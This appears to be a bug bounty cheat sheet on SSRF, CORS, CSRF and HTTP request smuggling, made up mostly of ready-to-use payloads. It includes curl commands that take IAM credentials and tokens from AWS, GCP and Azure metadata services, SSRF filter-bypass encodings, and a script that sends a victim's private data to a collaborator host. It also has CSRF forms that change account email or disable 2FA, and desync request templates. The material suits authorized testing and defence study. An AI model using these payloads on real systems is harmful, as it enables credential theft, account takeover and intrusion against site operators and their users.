---
title: "SSRF, CORS, CSRF & HTTP Request Smuggling"
description: "Server-side request forgery, cloud metadata theft, CORS misconfigurations, CSRF gadgets, and HTTP desync attacks"
tags:
  - Bug Bounty
  - SSRF
  - CORS
  - CSRF
  - Request Smuggling
---

# SSRF, CORS, CSRF & HTTP Desync

---

## 1. Server-Side Request Forgery (SSRF)

Where SSRF hides in 2026: **PDF/OG-image renderers, webhook delivery systems, image resizers/thumbnails, URL importers ("Import from URL"), RSS/feed parsers, and SAML metadata fetchers**.

=== " Detection Payloads"

    ```http
    POST /api/v1/render-pdf HTTP/1.1
    Host: <DOMAIN>

    {"url":"http://127.0.0.1:80/admin"}
    {"url":"http://localhost:8080/actuator/env"}
    {"url":"http://[::1]:8500/v1/agent/self"}
    {"url":"http://0.0.0.0:6379/"}
    {"url":"http://169.254.169.254/latest/meta-data/"}
    {"url":"http://<COLLABORATOR_DOMAIN>/ssrf-test"}
    {"url":"file:///etc/passwd"}
    {"url":"gopher://127.0.0.1:6379/_INFO"}
    {"url":"dict://127.0.0.1:11211/stat"}
    ```

=== " Cloud Metadata Endpoints"

    ```bash
    # AWS EC2 IMDSv1 (no token required)
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
    # AWS IMDSv2 (requires PUT / token first — look for SSRF that supports method=PUT)
    TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
    # GCP (requires Metadata-Flavor: Google header — some SSRF parsers pass custom headers)
    curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    # Azure IMDS
    curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    # DigitalOcean / Alibaba / Oracle variants
    curl http://169.254.169.254/metadata/v1/user-data
    curl http://100.100.100.200/latest/meta-data/
    curl http://192.0.0.192/latest/meta-data/
    ```

=== " SSRF Filter Bypasses"

    ```text
    # Decimal / Octal / Hex / Mixed IP encodings
    http://2130706433/ # 127.0.0.1
    http://0177.0.0.1/ # octal
    http://0x7f.0x0.0x0.0x1/ # hex
    http://127.1/ # short form
    http://127.0.0.1.nip.io/ # DNS resolves to 127.0.0.1
    http://①②⑦.⓪.⓪.①/ # unicode digits
    http://[::ffff:127.0.0.1]/ # IPv6-mapped
    # Redirect-based bypass (whitelist checks only the first URL)
    https://attacker.com/redirect.php?url=http://169.254.169.254/
    # DNS Rebinding (bypasses "resolve twice" checks) -> use rebind.network / 1u.ms
    http://make-127-0-0-1-rebind-169-254-169-254-rr.1u.ms/
    # CRLF in URL to smuggle Host header to internal services
    http://internal.host/%0d%0aHost:%20admin.internal
    # DNS over HTTPS exfiltration when only whitelisted domains allowed
    ```

---

## 2. Cross-Origin Resource Sharing (CORS) Misconfigurations

```bash
# Test if the origin is reflected with credentials allowed
curl -s -I https://<DOMAIN>/api/v1/me -H "Origin: https://evil.com" | grep -i "access-control"
# Vulnerable if you see BOTH:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

```javascript
// PoC that exfiltrates victim's private data cross-origin
<script>
  fetch('https://<DOMAIN>/api/v1/me', {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('https://<COLLABORATOR_DOMAIN>/cors?data=' + encodeURIComponent(d)));
</script>
```

| CORS Bypass Variant | Payload Origin |
| :--- | :--- |
| **Suffix match** | `https://evil.com.<DOMAIN>` → register `evil.com.<DOMAIN>`? Or use `https://<DOMAIN>.evil.com` if regex is naive. |
| **Prefix match** | `https://<DOMAIN>.evil.com` (naive `startsWith` check) |
| **Substring match** | `https://evil.com?<DOMAIN>` or `https://not<DOMAIN>.com` |
| **Null origin** | `Origin: null` — works from `<iframe sandbox="allow-scripts">` or `data:` URIs |
| **Regex metachar abuse** | If regex is unescaped, `https://<DOMAIN>.evil.com` or `https://evil<DOMAIN>` match. |
| **HTTP downgrade** | `http://<DOMAIN>` may be whitelisted while you serve from HTTP and MITM. |
| **Trusted third-party takeover** | Any whitelisted partner subdomain vulnerable to Subdomain Takeover = CORS bypass. |

---

## 3. Cross-Site Request Forgery (CSRF) & SameSite Bypasses

Modern browsers default to `SameSite=Lax`, so classic forms no longer work. These are the patterns that still land in 2026:

=== " SameSite=Lax Bypasses"

    ```html
    <!-- 1. GET-based state change: Lax allows top-level GET navigations -->
    <img src="https://<DOMAIN>/api/email/change?new=victim@attacker.com"> <!-- blocked, not top-level -->

    <!-- Working Lax bypass: top-level navigation (window.open / link click) -->
    <script>window.open('https://<DOMAIN>/api/v1/2fa/disable?confirm=1','_blank')</script>

    <!-- 2. Method override / _method=POST on a GET request -->
    <form action="https://<DOMAIN>/api/account" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <!-- 3. "Lax+POST" 2-minute grace window (freshly set cookies) -->
    <!-- 4. Chrome's "Lax-allowing-unsafe" for cookies < 2 min old after set -->

    <!-- 5. Bypass via sibling subdomain (SameSite considers eTLD+1) -->
    <!-- If ANY subdomain is XSS-vulnerable or takeover-able, SameSite is useless! -->
    ```

=== " When CSRF Token Exists"

    ```text
    - Token is not tied to the user session -> use YOUR OWN token in the victim's request
    - Token is static per-user and leaked in a GET page cached publicly
    - Token validation only checks presence, not value
    - Token can be removed entirely (server doesn't validate if missing)
    - Token in a cookie AND in body (double-submit) -> CRLF/set-cookie injection on subdomain
    - XSS anywhere on the target => CSRF token is bypassed automatically
    - JSON endpoints with no CSRF protection: use text/plain content-type to avoid preflight
      <form action="https://<DOMAIN>/api/v1/user" method="POST" enctype="text/plain">
        <input name='{"email":"attacker@evil.com","x":"' value='"}'>
      </form>
    ```

---

## 4. HTTP Request Smuggling / Desync (CL.TE, TE.CL, TE.TE, HTTP/2)

Front-end/back-end servers disagree about request boundaries → you can prefix the *next* user's request, hijack their session, bypass auth controls, or poison caches.

=== " Detecting Desync"

    ```http
    # CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)
    POST / HTTP/1.1
    Host: <DOMAIN>
    Content-Length: 13
    Transfer-Encoding: chunked

    0

    SMUGGLED
    # TE.CL (front-end uses TE, back-end uses CL)
    POST / HTTP/1.1
    Host: <DOMAIN>
    Content-Length: 3
    Transfer-Encoding: chunked

    8
    SMUGGLED
    0
    # TE obfuscation (TE.TE) variants to make only ONE server parse the header
    Transfer-Encoding: xchunked
    Transfer-Encoding : chunked
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    Transfer-Encoding:[tab]chunked
    X: X[\n]Transfer-Encoding: chunked
    Transfer-Encoding: "chunked"
    Transfer-Encoding: chunked\r\nTransfer-Encoding: cow
    ```

=== " Automating Detection with smuggler.py / HTTP Request Smuggler"

    ```bash
    # Burp "HTTP Request Smuggler" extension: right-click request -> Smuggle attack (CL.TE)
    # Then escalate:
    # - Bypass front-end auth checks (403 on front-end, allowed on back-end)
    # - Capture the NEXT user's request (session hijack / credential steal)
    # - Cache poisoning: poison a JS file for all users -> mass XSS
    # Standalone automated detection
    python3 smuggler.py -u https://<DOMAIN>/
    ```

=== " HTTP/2 Downgrade & H2.CL / H2.TE"

    ```text
    HTTP/2 -> HTTP/1.1 downgrade enables:
      - h2c smuggling (upgrade to cleartext HTTP/2 to bypass front-end auth)
      - H2.CL: inject Content-Length in HTTP/2 headers (browsers never send it)
      - H2.TE: inject Transfer-Encoding in HTTP/2 -> back-end uses chunked
      - Header injection via CRLF in HTTP/2 header values (allowed in H2 but splits in H1)
      - Request splitting via "Host:" header inside a header value
    ```